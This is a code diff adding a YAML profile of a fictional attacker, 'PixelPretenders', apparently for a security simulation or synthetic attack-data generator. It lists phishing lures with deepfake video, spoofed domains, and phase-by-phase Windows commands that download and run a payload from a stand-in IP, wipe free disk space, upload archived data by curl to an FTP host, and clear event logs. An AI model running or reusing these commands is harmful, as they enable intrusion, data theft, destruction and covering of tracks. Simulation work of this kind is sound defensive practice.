@@ -1,0 +1,128 @@
+metadata:
+  name: PixelPretenders
+  effectiveness: 90
+  count_init_passive_dns: 7
+  max_wave_size: 3
+  activity_start_date: "2024-08-01"
+  activity_end_date: "2024-08-15"
+  activity_start_hour: 16 # 4 PM PST, targeting after-hours activities
+  workday_length_hours: 12
+  working_days:
+    - Monday
+    - Tuesday
+    - Wednesday
+    - Thursday
+    - Friday
+
+spoofs_email: True
+init_target_roles:
+  - CEO
+  - CTO
+  - Lead AI Engineer
+  - PR Director
+  - IT Administrator
+
+final_target_roles:
+  - CEO
+  - CIO
+  - Head of Cyber Defense
+  - Senior Data Scientist
+
+reconnaissance:
+  - browse_social_media_profiles:
+      - search:
+          - "Mark Quirkyberg LinkedIn"
+          - "Sophia Neuralis Twitter"
+          - "FaceLook employee list"
+          - "FaceLook executive team"
+          - "FaceLook AI tools overview"
+      status_code: 200
+  - browse_internal_website:
+      - search:
+          - "DeepGuard AI tool documentation"
+          - "FaceLook employee directory"
+          - "internal communication channels"
+          - "AI system architecture"
+          - "crisis management procedures"
+      status_code: 200
+
+resource_development:
+  sender_themes:
+    - security@pixelpretenders.ai
+    - update@facelooksecure.com
+  custom_domains:
+    - "facelooksecure.com"
+    - "pixelpretenders.net"
+    - "deepguardupdate.com"
+  custom_ips:
+    - "192.168.1.101"
+    - "203.0.113.5"
+    - "45.33.32.156"
+  file_names:
+    - "CEO_announcement.mp4"
+    - "Security_Update.exe"
+  subjects:
+    - "Urgent: CEO Announcement Regarding Security Breach"
+    - "Mandatory Update: Security Patch Required"
+    - "Critical: AI Tool Update Required Immediately"
+
+malware:
+  - AIMask
+  - DataShade
+
+initial_access:
+  attacks:
+    - email:malware_delivery # Spear-phishing with deepfake video attached
+
+discovery:
+  - run_process_commands:
+      - name: cmd.exe
+        process: "whoami"
+      - name: cmd.exe
+        process: "ipconfig /all"
+      - name: cmd.exe
+        process: "netstat -an"
+      - name: powershell.exe
+        process: "Get-Process"
+      - name: powershell.exe
+        process: "Get-EventLog -LogName Security -Newest 10"
+      - name: powershell.exe
+        process: "Get-WmiObject -Class Win32_OperatingSystem"
+
+lateral_movement:
+  - run_process_commands:
+      - name: cmd.exe
+        process: "net use \\\\server\\share"
+      - name: powershell.exe
+        process: "Invoke-WebRequest -Uri http://45.33.32.156/payload.exe -OutFile C:\\Temp\\payload.exe"
+      - name: cmd.exe
+        process: "psexec.exe -s cmd.exe /c start payload.exe"
+
+impact:
+  - run_process_commands:
+      - name: powershell.exe
+        process: "Disable-ComputerRestore -Drive C:"
+      - name: cmd.exe
+        process: "cipher /w:C:\\"
+  - encrypt_files:
+      - ext: .ppcrypt
+        count: 1000
+  - create_files:
+      - path: "C:\\Users\\Public\\Desktop\\DEEP_FAKE_BREACH.mp4"
+      - sha256: e99a18c428cb38d5f260853678922e03abcd1234567890abcdef1234567890ab
+      - size: 43220000
+      - time_delay: seconds
+
+exfiltration:
+  - run_process_commands:
+      - name: powershell.exe
+        process: "Compress-Archive -Path C:\\SensitiveData -DestinationPath C:\\ExfilData.zip"
+      - name: cmd.exe
+        process: "curl -T C:\\ExfilData.zip ftp://203.0.113.5/upload/ --user exfil:pixelpass"
+
+covering_tracks:
+  - run_process_commands:
+      - name: cmd.exe
+        process: "wevtutil cl System"
+      - name: powershell.exe
+        process: "Remove-Item -Path C:\\Windows\\Temp\\*.log -Recurse -Force"
